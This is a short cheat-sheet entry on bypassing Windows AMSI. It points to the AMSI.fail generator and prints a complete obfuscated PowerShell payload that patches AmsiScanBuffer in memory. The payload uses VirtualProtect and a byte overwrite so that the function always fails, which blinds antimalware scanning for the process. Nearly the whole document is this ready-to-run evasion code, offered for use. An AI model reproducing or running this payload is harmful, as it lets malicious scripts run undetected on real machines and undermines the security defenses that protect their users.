# AMSI bypass

## AMSi.fail
Link to resource (https://amsi.fail/)
AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.

```Powershell
#Rasta-mouses Amsi-Scan-Buffer patch \n
$luezn = @"
using System;
using System.Runtime.InteropServices;
public class luezn {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr gaayhl, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $luezn

$injunwe = [luezn]::LoadLibrary("$(('ámsí.'+'dll').NORmAlize([cHAr]([ByTE]0x46)+[chAR]([bYTE]0x6f)+[chaR](114*109/109)+[cHar]([BYtE]0x6d)+[cHaR](68+54-54)) -replace [cHar](92+68-68)+[chaR]([BYTe]0x70)+[CHAr](123)+[cHar]([BYtE]0x4d)+[CHAR](110*45/45)+[cHar](125))")
$tkpctk = [luezn]::GetProcAddress($injunwe, "$([ChAR](8+57)+[cHAR](109+50-50)+[cHAR](115*56/56)+[CHAR]([bYTE]0x69)+[Char](36+47)+[cHAR](99)+[cHaR]([bYte]0x61)+[char]([BYTE]0x6e)+[CHar]([bYTE]0x42)+[char]([bYte]0x75)+[ChAR]([bytE]0x66)+[CHaR](83+19)+[cHAr](101*68/68)+[chAr](38+76))")
$p = 0
[luezn]::VirtualProtect($tkpctk, [uint32]5, 0x40, [ref]$p)
$xtwu = "0xB8"
$dtcl = "0x57"
$kpnv = "0x00"
$cjij = "0x07"
$jjki = "0x80"
$usev = "0xC3"
$vdxhq = [Byte[]] ($xtwu,$dtcl,$kpnv,$cjij,+$jjki,+$usev)
[System.Runtime.InteropServices.Marshal]::Copy($vdxhq, 0, $tkpctk, 6)
```
